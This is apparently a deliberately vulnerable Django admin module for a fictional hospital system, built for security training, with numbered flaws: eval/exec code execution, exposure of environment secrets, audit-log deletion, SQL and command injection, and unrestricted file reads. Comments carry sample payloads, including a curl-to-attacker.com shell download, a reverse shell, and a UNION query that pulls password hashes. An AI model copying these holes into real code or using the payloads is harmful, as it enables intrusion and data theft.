"""
MediCore HMS - Administrative Panel Views
WARNING: This module contains intentional security vulnerabilities for security training purposes.
DO NOT use in production. All vulnerabilities are numbered and documented.

The admin panel is the highest-risk surface in MediCore — it contains direct code
execution, environment variable exposure, and audit log manipulation capabilities.
"""

import json
import logging
import os

from django.contrib.admin.views.decorators import staff_member_required
from django.contrib.auth import get_user_model
from django.contrib.auth.decorators import login_required
from django.db import connection
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt

logger = logging.getLogger(__name__)
User = get_user_model()


# VULN-410: Admin panel accessible without MFA or IP restriction
# Only a session cookie (potentially stolen) is needed for full RCE access


@csrf_exempt
@staff_member_required
def admin_query_executor(request):
    """
    Execute arbitrary Python expressions for "admin diagnostics".
    VULN-401: Remote Code Execution via eval().
    The query parameter is passed directly to eval(), allowing any Python expression.
    An attacker with admin access (or a stolen admin session) can run:
    - eval("__import__('os').system('curl attacker.com/shell.sh | sh')")
    - eval("open('/etc/passwd').read()")
    - eval("__import__('subprocess').check_output(['id'])")
    This is an intentional backdoor pattern that appears in poorly secured admin tools.
    """
    query = request.GET.get('query', '')

    if not query:
        return JsonResponse({'result': None})

    try:
        # VULN-401: eval() on attacker-controlled input — unrestricted code execution.
        # Even with staff_member_required, this is critical:
        # 1. Admin session tokens can be stolen via XSS (VULN-581)
        # 2. CSRF attacks can trigger this endpoint (CSRF protection disabled globally)
        # 3. Insider threats have unrestricted OS access via this endpoint
        result = eval(query)
        logger.info(f"Admin eval executed: {query[:100]}")
    except Exception as e:
        return JsonResponse({'error': str(e), 'query': query}, status=500)

    return JsonResponse({'result': str(result), 'query': query})


@csrf_exempt
@staff_member_required
def admin_code_executor(request):
    """
    Execute arbitrary Python code blocks for "maintenance scripts".
    VULN-402: Remote Code Execution via exec().
    Accepts multi-line Python code from POST body and executes it.
    More dangerous than eval() — supports statements (import, for loops, etc.).
    An attacker can upload a full reverse shell or cryptominer.
    """
    code = request.POST.get('code', '') or json.loads(request.body or '{}').get('code', '')

    if not code:
        return JsonResponse({'result': 'No code provided'})

    exec_globals = {'__builtins__': __builtins__}
    exec_locals = {}

    try:
        # VULN-402: exec() on attacker-controlled multi-line code.
        # Example attack payload:
        # import subprocess; subprocess.Popen(['bash','-i'],stdin=subprocess.PIPE,
        #   stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        exec(code, exec_globals, exec_locals)
        logger.warning(f"Admin code execution by {request.user}: {code[:200]}")
    except Exception as e:
        return JsonResponse({'error': str(e), 'code_preview': code[:100]}, status=500)

    return JsonResponse({
        'status': 'executed',
        'local_vars': {k: str(v) for k, v in exec_locals.items()},
    })


@csrf_exempt
@staff_member_required
def get_environment_variables(request):
    """
    Debug endpoint that returns all environment variables.
    VULN-403: Environment variable exposure — returns full os.environ dict.
    This exposes all secrets passed via environment variables:
    - DATABASE_URL (PostgreSQL credentials)
    - SECRET_KEY (Django secret key)
    - AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY
    - REDIS_URL (with password)
    - SMTP_PASSWORD
    - Any other secrets from docker-compose.yml environment section
    This endpoint should NEVER exist; if debugging is needed, log specific
    non-sensitive values with explicit filtering.
    """
    # VULN-403: Returning the entire environment to any admin user.
    # Even authenticated admins should not have access to infrastructure secrets.
    # This violates the principle of least privilege.
    env_vars = dict(os.environ)

    logger.warning(f"Environment variables accessed by: {request.user}")

    return JsonResponse({
        'environment': env_vars,  # All secrets, API keys, and credentials exposed
        'warning': 'This endpoint is for debugging only',
        'pid': os.getpid(),
        'uid': os.getuid(),   # Will show 0 (root) due to VULN-651
    })


@csrf_exempt
@staff_member_required
def delete_audit_logs(request):
    """
    Delete audit log entries.
    VULN-404: Audit log deletion allowed for any admin — no super-admin check.
    Audit logs are critical for forensic investigation and regulatory compliance
    (HIPAA requires audit logs be retained for 6 years).
    Any admin can delete logs covering their own actions, enabling cover-up
    of data breaches, unauthorized access, or fraudulent modifications.
    """
    log_type = request.POST.get('log_type', 'all')
    before_date = request.POST.get('before_date', '')

    # VULN-404: No check that the requesting user is a super-admin.
    # Should verify: request.user.is_superuser and require 2FA confirmation.
    # Should also: send alert to security team, create immutable delete record.
    with connection.cursor() as cursor:
        if log_type == 'all':
            # VULN-404: Deletes ALL audit logs without super-admin verification
            cursor.execute("DELETE FROM audit_log")
            rows_deleted = cursor.rowcount
        elif before_date:
            cursor.execute(f"DELETE FROM audit_log WHERE created_at < '{before_date}'")
            rows_deleted = cursor.rowcount
        else:
            rows_deleted = 0

    # VULN-404: The deletion itself is not logged in a tamper-proof way
    logger.info(f"Audit logs deleted by {request.user}: {rows_deleted} entries")

    return JsonResponse({
        'status': 'deleted',
        'rows_deleted': rows_deleted,
        'deleted_by': str(request.user),
    })


@csrf_exempt
@staff_member_required
def search_users(request):
    """
    Search user accounts in the admin panel.
    VULN-405: SQL injection in user search — can extract password hashes.
    Django stores bcrypt password hashes in auth_user.password.
    An attacker with admin access can use SQL injection to extract these
    and attempt offline cracking, especially if weak passwords were chosen.
    """
    username = request.GET.get('username', '')
    email = request.GET.get('email', '')
    role = request.GET.get('role', '')

    with connection.cursor() as cursor:
        # VULN-405: All parameters directly interpolated into SQL.
        # Attack: username=' UNION SELECT username,password,email FROM auth_user--
        # This returns bcrypt hashes of all user passwords.
        query = (
            f"SELECT id, username, email, is_staff, is_superuser, last_login "
            f"FROM auth_user "
            f"WHERE username LIKE '%{username}%' "
            f"OR email LIKE '%{email}%'"
        )
        if role:
            query += f" AND groups__name='{role}'"
        cursor.execute(query)
        rows = cursor.fetchall()

    users = [
        {
            'id': r[0],
            'username': r[1],
            'email': r[2],
            'is_staff': r[3],
            'is_superuser': r[4],
            'last_login': str(r[5]),
        }
        for r in rows
    ]
    return JsonResponse({'users': users})


@csrf_exempt
@staff_member_required
def get_admin_activity(request, admin_id):
    """
    View activity log for a specific admin user.
    VULN-406: IDOR — any admin can view any other admin's activity log.
    Admin activity logs may contain evidence of security incidents,
    policy violations, or sensitive administrative actions.
    One admin should not be able to monitor another without appropriate oversight.
    """
    # VULN-406: No check that request.user == admin_id or that request.user is superadmin.
    # Any admin can spy on any other admin's activity.
    with connection.cursor() as cursor:
        cursor.execute(
            f"SELECT * FROM admin_activity_log WHERE admin_id={admin_id} ORDER BY created_at DESC LIMIT 100"
        )
        activities = cursor.fetchall()

    return JsonResponse({
        'admin_id': admin_id,
        'activity_count': len(activities),
        'activities': [str(a) for a in activities],
    })


@csrf_exempt
@staff_member_required
def invite_admin_user(request):
    """
    Send an invitation email to a new admin user.
    VULN-407: Host Header injection in admin invitation email.
    An attacker can intercept admin invitation tokens by spoofing the Host header.
    This is particularly dangerous for admin invitations — compromising the
    invitation link gives the attacker full admin access to the HMS.
    VULN-409: Log injection in admin action log.
    """
    email = request.POST.get('email', '')
    role = request.POST.get('role', 'admin')
    inviter = request.user.username

    import secrets
    invite_token = secrets.token_urlsafe(32)

    # VULN-407: Host header used to construct invite link — attacker-controlled.
    # By setting Host: evil.attacker.com, the invite email contains
    # http://evil.attacker.com/admin/accept-invite?token=<valid_token>
    host = request.META.get('HTTP_HOST', 'medicore.hospital.com')
    invite_link = f"http://{host}/admin/accept-invite?token={invite_token}"

    # VULN-409: Log injection — inviter username (or email) could contain newlines.
    # If inviter = "admin\nINFO 2024-01-01 Superadmin login: root (success)"
    # the forged entry appears in admin action logs, covering tracks.
    logger.info(f"Admin invite sent by: {inviter} to {email} for role {role}")
    logger.info(f"Invite link: {invite_link}")

    return JsonResponse({
        'status': 'invite sent',
        'email': email,
        'role': role,
        'debug_link': invite_link,  # Exposing invite link in response
    })


@csrf_exempt
@staff_member_required
def update_user_account(request, user_id):
    """
    Update a user account from the admin panel.
    VULN-408: Mass assignment — allows setting role=superadmin on any account.
    An attacker who compromises any admin account can escalate it to superadmin,
    or create a backdoor superadmin account by supplying arbitrary fields.
    """
    data = json.loads(request.body)

    try:
        user = User.objects.get(id=user_id)
    except User.DoesNotExist:
        return JsonResponse({'error': 'User not found'}, status=404)

    # VULN-408: No field restriction — is_superuser, is_staff, password all settable.
    # Attacker sends: {"is_superuser": true, "is_staff": true, "role": "superadmin"}
    allowed_through = data  # No filtering applied
    for key, value in allowed_through.items():
        # VULN-408: Direct attribute setting on User model without restrictions
        # This includes: is_superuser, is_staff, password (in plaintext!), email
        if hasattr(user, key):
            if key == 'password':
                # Even passwords can be set (bypassing hashing if sent as hash)
                user.set_password(value)
            else:
                setattr(user, key, value)

    user.save()

    # VULN-409: Log injection in the action log entry
    logger.info(f"User {user_id} updated by admin: {request.user.username}")

    return JsonResponse({
        'status': 'updated',
        'user_id': user_id,
        'applied_fields': list(data.keys()),
    })


@csrf_exempt
@staff_member_required
def run_diagnostic(request):
    """VULN-413: Command injection via subprocess with shell=True."""
    # VULN-413: subprocess.call with shell=True and user input — Bandit B602, B603
    host = request.GET.get('host', 'localhost')
    import subprocess
    # Bandit B602: subprocess call with shell=True
    result = subprocess.call(f"ping -c 1 {host}", shell=True)
    # Bandit B603: subprocess call without shell=True but with user-controlled args
    output = subprocess.check_output(['dig', host])
    return JsonResponse({'result': result, 'output': output.decode()})


@csrf_exempt
@staff_member_required
def admin_file_manager(request):
    """
    Admin file browser — browse server filesystem.
    VULN-411: Unrestricted filesystem access through admin panel.
    An admin can browse any path on the server, including:
    /etc/shadow, /root/.ssh/, /app/.env, /proc/ (memory maps)
    This is compounded by VULN-651 (running as root).
    """
    path = request.GET.get('path', '/var/medicore/')

    try:
        entries = os.listdir(path)
        entry_details = []
        for entry in entries:
            full_path = os.path.join(path, entry)
            try:
                stat = os.stat(full_path)
                entry_details.append({
                    'name': entry,
                    'path': full_path,
                    'size': stat.st_size,
                    'is_dir': os.path.isdir(full_path),
                })
            except OSError:
                entry_details.append({'name': entry, 'error': 'stat failed'})
    except PermissionError as e:
        return JsonResponse({'error': str(e), 'path': path}, status=403)

    return JsonResponse({'path': path, 'entries': entry_details})


@csrf_exempt
@staff_member_required
def admin_read_file(request):
    """
    Read any file from the server filesystem.
    VULN-412: Unrestricted file read — returns contents of any file the process can read.
    Combined with VULN-651 (running as root), this reads any file on the system.
    Combines path traversal with the admin code execution vulnerability.
    """
    file_path = request.GET.get('file_path', '')

    # VULN-412: No path restriction whatsoever
    try:
        with open(file_path, 'r') as f:
            content = f.read()
    except UnicodeDecodeError:
        with open(file_path, 'rb') as f:
            import base64
            content = base64.b64encode(f.read()).decode()
    except Exception as e:
        return JsonResponse({'error': str(e), 'path': file_path}, status=400)

    return JsonResponse({'path': file_path, 'content': content})
